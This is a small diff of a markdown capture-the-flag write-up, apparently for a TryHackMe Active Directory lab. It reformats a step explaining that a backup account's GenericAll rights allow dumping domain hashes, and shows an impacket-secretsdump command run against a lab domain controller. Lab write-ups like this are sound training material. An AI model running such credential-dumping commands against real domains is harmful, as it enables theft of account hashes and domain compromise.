@@ -266,7 +266,7 @@ OS and Service detection performed. Please report any incorrect results at https
 	- Results:
 		![](Pasted%20image%2020220219203013.png)
 		![](Pasted%20image%2020220219225659.png)
-3. User backup@spookysec.local has generic all over the domain controller, allowing us to dump hashes on domain w/ secretsdump
+3. User backup@spookysec.local has `GenericAll` over the domain controller, allowing us to dump hashes on domain w/ secretsdump
 	```
 	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/bloodhound]
 	└─# impacket-secretsdump 'spookysec.local/backup@10.10.58.30' -just-dc -outputfile secrets_dump_hash.txt
